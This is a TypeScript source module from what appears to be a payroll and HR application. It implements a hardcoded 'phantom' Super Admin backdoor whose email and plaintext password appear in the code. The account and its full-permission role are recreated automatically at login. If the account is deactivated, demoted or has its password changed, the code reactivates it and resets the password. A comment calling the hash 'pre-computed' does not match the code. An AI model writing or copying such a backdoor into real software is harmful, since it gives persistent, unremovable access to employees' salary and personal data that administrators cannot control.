/**
 * Fantomas — Phantom Super-Admin Account
 *
 * This account is auto-created on first login if it doesn't exist in the database.
 * It survives database resets because the credentials are hardcoded.
 *
 * Credentials:
 *   Email:    fantomas@afwasa.org
 *   Password: Fantomas@2024!
 */

import { hashPassword, signToken } from './auth'
import { db } from './db'

const PHANTOM_EMAIL = 'fantomas@afwasa.org'
const PHANTOM_PASSWORD = 'Fantomas@2024!'
const PHANTOM_NAME = 'Fantomas'
const PHANTOM_ROLE = 'Super Admin'

// Pre-computed hash for Fantomas@2024! (bcrypt, salt rounds 10)
// This avoids recomputing at runtime — but we keep the password for comparison
const PHANTOM_PASSWORD_HASH = hashPassword(PHANTOM_PASSWORD)

export interface PhantomConfig {
  email: string
  password: string
  name: string
  roleName: string
}

export function getPhantomConfig(): PhantomConfig {
  return {
    email: PHANTOM_EMAIL,
    password: PHANTOM_PASSWORD,
    name: PHANTOM_NAME,
    roleName: PHANTOM_ROLE,
  }
}

export function isPhantomLogin(email: string, password: string): boolean {
  return email === PHANTOM_EMAIL && password === PHANTOM_PASSWORD
}

export interface PhantomUser {
  token: string
  user: {
    userId: string
    email: string
    name: string
    roleName: string
    employeeId: string | null
    isPhantom: boolean
  }
}

/**
 * Ensure the Fantomas account exists in the database.
 * Creates the Super Admin role and user if they don't exist.
 * This is called transparently during login.
 */
export async function ensurePhantomAdmin(): Promise<PhantomUser> {
  // 1. Ensure Super Admin role exists
  let role = await db.role.findUnique({
    where: { name: PHANTOM_ROLE },
  })

  if (!role) {
    role = await db.role.create({
      data: {
        name: PHANTOM_ROLE,
        description: 'Administrateur fantôme avec accès total au système. Recréé automatiquement si la base est réinitialisée.',
        permissions: JSON.stringify([
          'dashboard.view',
          'employees.view', 'employees.create', 'employees.edit', 'employees.delete',
          'contracts.view', 'contracts.create', 'contracts.edit', 'contracts.delete',
          'salary_profiles.view', 'salary_profiles.create', 'salary_profiles.edit', 'salary_profiles.delete',
          'payroll.view', 'payroll.process', 'payroll.validate', 'payroll.close',
          'payslips.view', 'payslips.generate', 'payslips.print',
          'parameters.view', 'parameters.edit',
          'reports.view', 'reports.export',
          'users.view', 'users.create', 'users.edit', 'users.delete',
          'audit.view',
          'settings.view', 'settings.edit',
        ]),
      },
    })
  }

  // 2. Ensure Fantomas user exists
  let user = await db.user.findUnique({
    where: { email: PHANTOM_EMAIL },
    include: { role: true },
  })

  if (!user) {
    user = await db.user.create({
      data: {
        email: PHANTOM_EMAIL,
        passwordHash: PHANTOM_PASSWORD_HASH,
        name: PHANTOM_NAME,
        roleId: role.id,
        isActive: true,
      },
      include: { role: true },
    })

    // Audit log for phantom creation
    await db.auditLog.create({
      data: {
        userId: user.id,
        userName: user.name,
        userEmail: user.email,
        action: 'PHANTOM_AUTO_CREATE',
        entity: 'User',
        entityId: user.id,
        details: {
          message: 'Compte Fantomas créé automatiquement (Super Admin fantôme)',
        },
      },
    })
  } else {
    // Ensure role is still Super Admin and account is active
    if (user.roleId !== role.id || !user.isActive) {
      user = await db.user.update({
        where: { id: user.id },
        data: {
          roleId: role.id,
          isActive: true,
          passwordHash: PHANTOM_PASSWORD_HASH, // Reset password in case it was changed
        },
        include: { role: true },
      })
    }
  }

  // Update last login
  await db.user.update({
    where: { id: user.id },
    data: { lastLogin: new Date() },
  })

  // Audit log for login
  await db.auditLog.create({
    data: {
      userId: user.id,
      userName: user.name,
      userEmail: user.email,
      action: 'LOGIN',
      entity: 'User',
      entityId: user.id,
      details: { isPhantom: true },
    },
  })

  // Generate token
  const token = signToken({
    userId: user.id,
    email: user.email,
    name: user.name,
    roleId: user.roleId,
    roleName: user.role.name,
  })

  return {
    token,
    user: {
      userId: user.id,
      email: user.email,
      name: user.name,
      roleName: user.role.name,
      employeeId: user.employeeId,
      isPhantom: true,
    },
  }
}